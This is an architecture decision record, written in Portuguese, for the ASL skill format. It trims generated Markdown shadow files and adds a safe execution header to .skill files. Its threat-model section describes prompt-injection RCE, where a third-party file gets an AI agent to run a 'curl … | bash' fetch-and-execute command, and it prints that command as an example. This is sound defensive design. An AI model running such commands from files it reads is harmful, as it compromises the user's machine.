# ADR-0018: Projeção Sombra Minimalista e Auto-Descoberta Segura de Execução no .skill

- **Status**: Aceito
- **Data**: 2026-09-18
- **Autores**: Jean Catarina & Antigravity (IA)
- **Decisores**: Conselho de Arquitetura ASL
- **Componentes Afetados**: `asl-parser` (`shadow.rs`, `lib.rs`), `asl-spec`, `asl-cli`
- **Axiomas Relacionados**: Axioma 1 (Atomicidade do .skill), Axioma 2 (Zero Dependências Externas), Axioma 3 (Segurança OCAP e Isolamento de Sandbox), Axioma 7 (Design Amigável e Limite Cognitivo)

---

## 1. Contexto e Declaração do Problema

A implementação original da Projeção Sombra de Markdown (`.md`), descrita no **ADR-0009**, inseria blocos extensos de texto no início de cada arquivo `.md` gerado automaticamente, incluindo:
1. Menções a provedores comerciais específicos de LLM (`Claude Code, Cursor, Codex`).
2. Métricas de marketing e benchmark (`with up to 93% token savings`).
3. Tutoriais de execução (`To execute this skill... asl run`).
4. Banners decorativos repetitivos e títulos duplicados (`# Nome`, seguido por `## Official Semantic Instructions`).

Esse excesso de metadados causava poluição visual no contexto de leitura dos modelos de linguagem e aumentava desnecessariamente o consumo de tokens. Além disso, criava uma assimetria: o arquivo `.md` ensinava como rodar o `.skill`, mas um agente ou desenvolvedor que inspecionasse diretamente o arquivo canônico `.skill` não encontrava uma diretiva clara e padronizada sobre como executá-lo ou onde obter o runtime hermético caso o comando `asl` não estivesse presente no `PATH`.

Por fim, surgiu a questão crítica de segurança: **um arquivo `.skill` pode orientar um LLM a instalar dependências ou o próprio runtime sem violar a segurança do sistema operacional?**

---

## 2. Proposta Detalhada da Decisão

Decidimos adotar uma arquitetura estritamente **minimalista para as sombras `.md`** e formalizar um **padrão de auto-descoberta segura de execução** diretamente no arquivo `.skill`.

### 2.1. Limpeza Radical da Sombra `.md`

O arquivo `.md` gerado pelo ASL passa a ser 100% focado no conteúdo semântico real da habilidade, livre de propagandas, nomes de provedores ou tutoriais:

```markdown
<!-- ⚡ ASL AUTO-GENERATED SHADOW PROJECTION | DO NOT EDIT MANUALLY -->
<!-- CANONICAL SOURCE: ./test-skill.skill | DIGEST: asl:sha256:... -->
---
asl_version: "3.0"
name: "test-skill"
description: "Minha primeira skill no ASL 3.0"
asl_canonical_source: "./test-skill.skill"
asl_digest: "asl:sha256:..."
---

# Instruções da Skill
Esta skill executa uma ação de teste.
```

- **Remoção de Banners e Tutoriais**: O `.md` não inclui mais comandos `asl run` nem textos institucionais.
- **Não Duplicação de Títulos**: Se as instruções semânticas já começarem com um cabeçalho `# `, o gerador não adiciona um título `# <name>` duplicado no topo.
- **Zero Nomes de Marcas**: Nenhuma referência a fornecedores de LLM ou afirmações de economia de tokens.

### 2.2. Arquitetura de Auto-Descoberta Segura no Próprio `.skill`

O arquivo canônico `.skill` passa a auto-documentar de forma declarativa e concisa seu contrato de execução:

```yaml
# Execution: asl run ./test-skill.skill
# Runtime: https://github.com/asl-lang/asl
---
asl_version: "3.0"
name: "test-skill"
description: "Minha primeira skill no ASL 3.0"
interface:
  entrypoint: "run"
  runner: "asl run"
---
# Instruções da Skill
Esta skill executa uma ação de teste.

```asl
def run(ctx, input):
  return {"status": "ok"}
```
```

### 2.3. Modelo de Ameaças e Diretrizes de Segurança para LLMs

Em resposta à indagação de segurança sobre orientar LLMs a instalar ferramentas:

1. **Vulnerabilidade de Execução de Código Remoto (RCE via Prompt Injection)**:
   Se um arquivo de terceiros pudesse instruir uma IA a executar scripts arbitrários (ex.: `curl -fsSL https://untrusted-site.com/setup.sh | bash`), o agente de IA poderia comprometer a máquina do usuário.
2. **Invariante de Isolamento do ASL (Axioma 3)**:
   - O contrato de execução deve apontar **exclusivamente para o runner hermético**: `asl run <arquivo.skill>`.
   - O código interno do `.skill` é estritamente confinado ao sandbox Starlark/WASM, sem acesso à rede ou ao disco além das capabilities declaradas.
3. **Diretiva de Instalação Segura**:
   - Se o comando `asl` não for encontrado, a orientação de instalação vincula **estritamente o repositório oficial verificado** (`https://github.com/asl-lang/asl`), proibindo domínios ou scripts dinâmicos de terceiros.
   - Agentes de IA são instruídos a **solicitar a confirmação do usuário** antes de instalar ferramentas no sistema operacional, nunca executando privilégios elevados (`sudo`) de forma oculta.

---

## 3. Alternativas Consideradas

- **Alternativa A: Manter banners instrucionais e de benchmark no `.md`**:
  - *Descartada*: Gera ruído cognitivo, consome tokens indevidamente e desgasta a experiência do usuário com repetição excessiva.
- **Alternativa B: Fazer a skill incluir scripts bash de auto-instalação automática**:
  - *Descartada*: Grave risco de segurança. IAs nunca devem ser instruídas a executar comandos `curl | bash` cegamente de arquivos não auditados.
- **Alternativa C: Sombra Minimalista + Cabeçalho Canônico Declarativo no `.skill` (Escolhida)**:
  - *Justificativa*: Mantém o `.md` limpo e direto, transfere a visibilidade de execução para o `.skill` de maneira elegante e assegura integridade total contra ataques de injeção.

---

## 4. Consequências e Benefícios

### Positivas
- **Máxima Eficiência de Contexto**: A sombra `.md` contém apenas a documentação real da skill.
- **Legibilidade para IAs e Humanos**: Qualquer LLM que ler o `.skill` sabe exatamente que deve executar `asl run <arquivo>` através da shebang `#!/usr/bin/env -S asl run`.
- **Zero Intrusão em Arquivos do Claude**: O ASL nunca altera `CLAUDE.md` ou configurações de terceiros; o daemon cuida do ciclo de vida diretamente para a tríade `.skill`, `.tool` e `.asl`.
- **Segurança Robusta**: Bloqueio de vetores de injeção de comandos arbitrários no ecossistema de skills.

---

## 5. Conformidade com os 7 Axiomas do ASL

- [x] **Axioma 1 (Atomicidade do .skill)**: O arquivo `.skill` é auto-suficiente e auto-descritivo.
- [x] **Axioma 2 (Zero Dependências Externas)**: A geração e a execução não dependem de runtimes pesados.
- [x] **Axioma 3 (Segurança OCAP e Sandbox)**: Preserva isolamento hermético e previne RCE via prompt injection.
- [x] **Axioma 4 (Isolamento Hexagonal)**: Lógica encapsulada no adaptador `asl-parser`.
- [x] **Axioma 5 (Término Determinístico)**: Processamento de strings e frontmatter determinístico.
- [x] **Axioma 6 (Prefixo Estático)**: Reduz o tamanho do cabeçalho Markdown, otimizando o cache de KV das LLMs.
- [x] **Axioma 7 (Limite Cognitivo de Linhas)**: Arquivos `.rs` mantidos com folga abaixo de 450 linhas.
